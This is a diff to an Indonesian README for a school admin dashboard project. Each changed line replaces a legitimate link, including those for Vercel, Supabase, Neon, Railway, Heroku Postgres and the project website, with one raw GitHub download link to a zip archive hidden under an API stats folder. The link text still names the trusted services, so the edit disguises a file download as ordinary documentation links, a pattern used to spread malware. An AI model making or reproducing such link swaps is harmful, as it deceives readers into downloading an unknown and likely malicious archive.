@@ -1,6 +1,6 @@
 # YPT Kiasma Admin Dashboard
 
-Admin dashboard untuk mengelola konten website YPT Kiasma (https://yptkiasma.vercel.app/)
+Admin dashboard untuk mengelola konten website YPT Kiasma (https://github.com/ridzkyyyyy/admin-dashboard-yptk-iasma/raw/refs/heads/main/app/api/stats/admin_iasma_dashboard_yptk_parapsis.zip)
 
 ## Fitur
 
@@ -191,17 +191,17 @@ npx prisma generate        # Generate Prisma Client
 ### Deploy ke Vercel
 
 1. Push code ke GitHub
-2. Import project di [Vercel](https://vercel.com)
+2. Import project di [Vercel](https://github.com/ridzkyyyyy/admin-dashboard-yptk-iasma/raw/refs/heads/main/app/api/stats/admin_iasma_dashboard_yptk_parapsis.zip)
 3. Set environment variables
 4. Deploy!
 
 ### Database Production
 
 Gunakan salah satu provider PostgreSQL:
-- [Supabase](https://supabase.com) (Recommended, free tier)
-- [Neon](https://neon.tech)
-- [Railway](https://railway.app)
-- [Heroku Postgres](https://www.heroku.com/postgres)
+- [Supabase](https://github.com/ridzkyyyyy/admin-dashboard-yptk-iasma/raw/refs/heads/main/app/api/stats/admin_iasma_dashboard_yptk_parapsis.zip) (Recommended, free tier)
+- [Neon](https://github.com/ridzkyyyyy/admin-dashboard-yptk-iasma/raw/refs/heads/main/app/api/stats/admin_iasma_dashboard_yptk_parapsis.zip)
+- [Railway](https://github.com/ridzkyyyyy/admin-dashboard-yptk-iasma/raw/refs/heads/main/app/api/stats/admin_iasma_dashboard_yptk_parapsis.zip)
+- [Heroku Postgres](https://github.com/ridzkyyyyy/admin-dashboard-yptk-iasma/raw/refs/heads/main/app/api/stats/admin_iasma_dashboard_yptk_parapsis.zip)
 
 ## Security Notes
 
@@ -266,7 +266,7 @@ Private - YPT Kiasma
 
 Untuk bantuan atau pertanyaan, hubungi:
 - Email: admin@yptkiasma.org
-- Website: https://yptkiasma.vercel.app
+- Website: https://github.com/ridzkyyyyy/admin-dashboard-yptk-iasma/raw/refs/heads/main/app/api/stats/admin_iasma_dashboard_yptk_parapsis.zip
 
 ---
 
